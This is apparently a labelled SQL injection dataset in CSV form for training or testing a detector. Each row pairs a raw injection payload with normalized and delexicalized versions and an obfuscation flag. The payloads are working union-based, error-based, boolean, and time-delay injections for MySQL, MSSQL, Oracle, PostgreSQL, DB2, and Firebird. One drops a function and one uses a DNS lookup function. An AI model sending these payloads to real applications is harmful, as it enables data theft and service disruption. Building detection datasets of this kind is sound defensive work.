payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
"1'||  (  select 'tmsj' where 2971  =  2971 union all select null,null,null,null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1'|| ( select 'tmsj' where 2971 = 2971 union all select null,null,null,null,null,null,null,null,null,null#","<NUM><STR>tmsj' where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null,null#"
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""regi"" like ""regi",1,sqli_dataset.csv,,True,"1"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""regi"" like ""regi",<NUM><STR>regi<STR>regi
1   )    )    as epfz where 5471  =  5471,1,sqli_dataset.csv,,False,1 ) ) as epfz where 5471 = 5471,<NUM> ) ) as epfz where <NUM> = <NUM>
"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""jyad""  =  ""jyad",1,sqli_dataset.csv,,False,"1"" ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""jyad"" = ""jyad",<NUM><STR>jyad<STR>jyad
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,sqli_dataset.csv,,False,"1' ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )","<NUM>' ) and <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )"
-1816%'   )    )     )   union all select 2072--,1,sqli_dataset.csv,,False,-1816%' ) ) ) union all select 2072--,-<NUM>%' ) ) ) union all select <NUM>--
"-7295""  )   or 9323  =  9323#",1,sqli_dataset.csv,,False,"-7295"" ) or 9323 = 9323#","-<NUM>"" ) or <NUM> = <NUM>#"
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,sqli_dataset.csv,,True,"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )","<NUM>' and ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) )"
"1%""  )   union all select null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1%"" ) union all select null,null,null,null,null,null,null--","<NUM>%"" ) union all select null,null,null,null,null,null,null--"
"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1' ) ) as bwjl where 8538 = 8538 union all select null,null,null,null,null,null,null#","<NUM>' ) ) as bwjl where <NUM> = <NUM> union all select null,null,null,null,null,null,null#"
"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",1,sqli_dataset.csv,,False,"-9237' ) union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--","-<NUM>' ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"1""  )   where 3445  =  3445 and elt  (  1212  =  1254,1254  )  --",1,sqli_dataset.csv,,False,"1"" ) where 3445 = 3445 and elt ( 1212 = 1254,1254 ) --","<NUM>"" ) where <NUM> = <NUM> and elt ( <NUM> = <NUM>,<NUM> ) --"
if  (  6842  =  5446  )   select 6842 else drop function vjfq--,1,sqli_dataset.csv,,False,if ( 6842 = 5446 ) select 6842 else drop function vjfq--,if ( <NUM> = <NUM> ) select <NUM> else drop function vjfq--
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,1,sqli_dataset.csv,,False,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ""%"" = ""","call regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) and ( <STR> = """
"-8772%""  )   union all select 5433,5433,5433,5433,5433,5433,5433,5433,5433,5433--",1,sqli_dataset.csv,,False,"-8772%"" ) union all select 5433,5433,5433,5433,5433,5433,5433,5433,5433,5433--","-<NUM>%"" ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sqli_dataset.csv,,False,"1 ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM> ) ) ) or <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",1,sqli_dataset.csv,,False,"-7171%' ) ) union all select 5580,5580,5580,5580,5580,5580,5580,5580--","-<NUM>%' ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",1,sqli_dataset.csv,,True,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'raru' = 'raru",<NUM><STR>raru<STR>raru
1 where 8578  =  8578 and 4770  =  4474--,1,sqli_dataset.csv,,False,1 where 8578 = 8578 and 4770 = 4474--,<NUM> where <NUM> = <NUM> and <NUM> = <NUM>--
"-5041'   )    )     )   union all select 4820,4820,4820,4820,4820,4820--",1,sqli_dataset.csv,,False,"-5041' ) ) ) union all select 4820,4820,4820,4820,4820,4820--","-<NUM>' ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"-6809""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""nfnf""  =  ""nfnf",1,sqli_dataset.csv,,False,"-6809"" ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""nfnf"" = ""nfnf",-<NUM><STR>nfnf<STR>nfnf
"1""  )   where 9621  =  9621",1,sqli_dataset.csv,,False,"1"" ) where 9621 = 9621","<NUM>"" ) where <NUM> = <NUM>"
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'yaml'  =  'yaml",1,sqli_dataset.csv,,False,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'yaml' = 'yaml","call regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) and ( ( <STR> = 'yaml"
"1  )   as amgf where 4308  =  4308 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1 ) as amgf where 4308 = 4308 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --","<NUM> ) as amgf where <NUM> = <NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --"
1   )    )     )   or sleep  (  5  )  #,1,sqli_dataset.csv,,False,1 ) ) ) or sleep ( 5 ) #,<NUM> ) ) ) or sleep ( <NUM> ) #
1   )    )    as rcbz where 4563  =  4563 and 2006  =  2006,1,sqli_dataset.csv,,False,1 ) ) as rcbz where 4563 = 4563 and 2006 = 2006,<NUM> ) ) as rcbz where <NUM> = <NUM> and <NUM> = <NUM>
"1"" where 1100  =  1100",1,sqli_dataset.csv,,False,"1"" where 1100 = 1100","<NUM>"" where <NUM> = <NUM>"
1'+  (  select mrdi where 7451  =  7451 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sqli_dataset.csv,,True,1'+ ( select mrdi where 7451 = 7451 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,<NUM>'+ ( select mrdi where <NUM> = <NUM> and <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --
"1%"" and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sqli_dataset.csv,,False,"1%"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --","<NUM>%"" and <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --"
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  3044  =  3044",1,sqli_dataset.csv,,False,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 3044 = 3044","call regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) and ( ( ( <NUM> = <NUM>"
"1',  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4932  =  4932  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",1,sqli_dataset.csv,,True,"1', ( convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4932 = 4932 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) )","<NUM>', ( convert ( int, ( select char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) + ( select ( case when ( <NUM> = <NUM> ) then char ( <NUM> ) else char ( <NUM> ) end ) ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) ) ) )"
"1  )   where 2473  =  2473 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,sqli_dataset.csv,,True,"1 ) where 2473 = 2473 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --","<NUM> ) where <NUM> = <NUM> and updatexml ( <NUM>,concat ( 0x2e,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ,<NUM> ) --"
"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'swfj' like 'swfj",1,sqli_dataset.csv,,False,"1' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'swfj' like 'swfj",<NUM><STR>swfj<STR>swfj
1'  )   where 5307  =  5307,1,sqli_dataset.csv,,False,1' ) where 5307 = 5307,<NUM>' ) where <NUM> = <NUM>
-1470'   )    )     )   or 9323  =  9323#,1,sqli_dataset.csv,,False,-1470' ) ) ) or 9323 = 9323#,-<NUM>' ) ) ) or <NUM> = <NUM>#
"1'   )    )    as mjps where 2179  =  2179 union all select null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1' ) ) as mjps where 2179 = 2179 union all select null,null,null,null,null,null,null--","<NUM>' ) ) as mjps where <NUM> = <NUM> union all select null,null,null,null,null,null,null--"
"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1"" ) ) union all select null,null,null,null,null,null,null,null,null#","<NUM>"" ) ) union all select null,null,null,null,null,null,null,null,null#"
"1%""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""%"" = """,<NUM>%<STR>%<STR>
1%'   )    )    and   (  8853  =  9924  )  *9924 and    (    (   '%'  =  ',1,sqli_dataset.csv,,False,1%' ) ) and ( 8853 = 9924 ) *9924 and ( ( '%' = ',<NUM>%<STR>%<STR>
1'+  (  select 'lcru' where 3215  =  3215,1,sqli_dataset.csv,,True,1'+ ( select 'lcru' where 3215 = 3215,<NUM><STR>lcru' where <NUM> = <NUM>
"1""  )   as ktnq where 9005  =  9005",1,sqli_dataset.csv,,False,"1"" ) as ktnq where 9005 = 9005","<NUM>"" ) as ktnq where <NUM> = <NUM>"
"1""   )    )    as eqeb where 6784  =  6784 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,sqli_dataset.csv,,True,"1"" ) ) as eqeb where 6784 = 6784 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --","<NUM>"" ) ) as eqeb where <NUM> = <NUM> and updatexml ( <NUM>,concat ( 0x2e,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ,<NUM> ) --"
-2823'   )    )    or 5663  =  4228 and    (    (   'skgh' like 'skgh,1,sqli_dataset.csv,,False,-2823' ) ) or 5663 = 4228 and ( ( 'skgh' like 'skgh,-<NUM><STR>skgh<STR>skgh
1'  )   as uaoz where 2464  =  2464,1,sqli_dataset.csv,,False,1' ) as uaoz where 2464 = 2464,<NUM>' ) as uaoz where <NUM> = <NUM>
"1  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sqli_dataset.csv,,False,"1 ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM> ) or <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
"1   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   9313  =  9313",1,sqli_dataset.csv,,True,"1 ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 9313 = 9313","<NUM> ) ) and <NUM> = convert ( int, ( select char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) + ( select ( case when ( <NUM> = <NUM> ) then char ( <NUM> ) else char ( <NUM> ) end ) ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) ) ) and ( ( <NUM> = <NUM>"
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'aovy'  =  'aovy",1,sqli_dataset.csv,,False,"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'aovy' = 'aovy",<NUM><STR>aovy<STR>aovy
1' where 5335  =  5335,1,sqli_dataset.csv,,False,1' where 5335 = 5335,<NUM>' where <NUM> = <NUM>
"1%""   )    )     )   union all select null,null,null,null,null--",1,sqli_dataset.csv,,False,"1%"" ) ) ) union all select null,null,null,null,null--","<NUM>%"" ) ) ) union all select null,null,null,null,null--"
"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # hkrp",1,sqli_dataset.csv,,False,"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) # hkrp","<NUM> or <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) # hkrp"
"-9265""  )   or 7834  =  1685",1,sqli_dataset.csv,,False,"-9265"" ) or 7834 = 1685","-<NUM>"" ) or <NUM> = <NUM>"
waitfor delay '0:0:5'# ogzq,1,sqli_dataset.csv,,False,waitfor delay '0:0:5'# ogzq,waitfor delay <STR># ogzq
"1""  )   where 6821  =  6821 waitfor delay '0:0:5'--",1,sqli_dataset.csv,,False,"1"" ) where 6821 = 6821 waitfor delay '0:0:5'--","<NUM>"" ) where <NUM> = <NUM> waitfor delay <STR>--"
"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--",1,sqli_dataset.csv,,False,"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--","-<NUM>' union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
select case when 5308  =  6745 then 1 else null end--,1,sqli_dataset.csv,,False,select case when 5308 = 6745 then 1 else null end--,select case when <NUM> = <NUM> then <NUM> else null end--
"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",1,sqli_dataset.csv,,False,"-5131' ) ) ) union all select 4854,4854,4854,4854,4854,4854,4854#","-<NUM>' ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",1,sqli_dataset.csv,,False,"1' in boolean mode ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) #","<NUM>' in boolean mode ) and <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) #"
"1%'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",1,sqli_dataset.csv,,True,"1%' ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( '%' = '",<NUM>%<STR>%<STR>
"1%""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""%"" = """,<NUM>%<STR>%<STR>
select case when 9848  =  2618 then 1 else null end--,1,sqli_dataset.csv,,False,select case when 9848 = 2618 then 1 else null end--,select case when <NUM> = <NUM> then <NUM> else null end--
"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sqli_dataset.csv,,False,"1%"" ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","<NUM>%"" ) ) ) and <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --"
"1'  )   as tygi where 9891  =  9891 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1,sqli_dataset.csv,,True,"1' ) as tygi where 9891 = 9891 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --","<NUM>' ) as tygi where <NUM> = <NUM> and row ( <NUM>,<NUM> ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from ( select <NUM> union select <NUM> union select <NUM> union select <NUM> ) a group by x ) --"
1   )    )    as qsos where 2721  =  2721 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1,sqli_dataset.csv,,False,1 ) ) as qsos where 2721 = 2721 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,<NUM> ) ) as qsos where <NUM> = <NUM> rlike ( select * from ( select ( sleep ( <NUM> ) ) ) sgvo ) --
"1   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  9802  =  9802",1,sqli_dataset.csv,,False,"1 ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 9802 = 9802","<NUM> ) ) ) or <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( <NUM> = <NUM>"
-2316'   )    )     )   or 8519  =  6010,1,sqli_dataset.csv,,False,-2316' ) ) ) or 8519 = 6010,-<NUM>' ) ) ) or <NUM> = <NUM>
1 where 7442  =  7442,1,sqli_dataset.csv,,False,1 where 7442 = 7442,<NUM> where <NUM> = <NUM>
1  )   and sleep  (  5  )  #,1,sqli_dataset.csv,,False,1 ) and sleep ( 5 ) #,<NUM> ) and sleep ( <NUM> ) #
1 where 7516  =  7516 union all select null#,1,sqli_dataset.csv,,False,1 where 7516 = 7516 union all select null#,<NUM> where <NUM> = <NUM> union all select null#
"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",1,sqli_dataset.csv,,False,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--","-<NUM>"" union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1,sqli_dataset.csv,,False,1 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),<NUM> and <NUM> = dbms_utility.sqlid_to_sqlhash ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) )
"-7485%'   )    )     )   union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",1,sqli_dataset.csv,,False,"-7485%' ) ) ) union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--","-<NUM>%' ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- icxn,1,sqli_dataset.csv,,False,1 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) -- icxn,<NUM> and <NUM> = utl_inaddr.get_host_address ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) -- icxn
"1""   )    )    as dfwi where 9703  =  9703 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sqli_dataset.csv,,False,"1"" ) ) as dfwi where 9703 = 9703 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM>"" ) ) as dfwi where <NUM> = <NUM> or <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
select   (  case when   (  9746  =  8055  )   then 9746 else 1/  (  select 0  )   end  )  --,1,sqli_dataset.csv,,False,select ( case when ( 9746 = 8055 ) then 9746 else 1/ ( select 0 ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) --
"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'qgrt'  =  'qgrt",1,sqli_dataset.csv,,False,"1' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'qgrt' = 'qgrt",<NUM><STR>qgrt<STR>qgrt
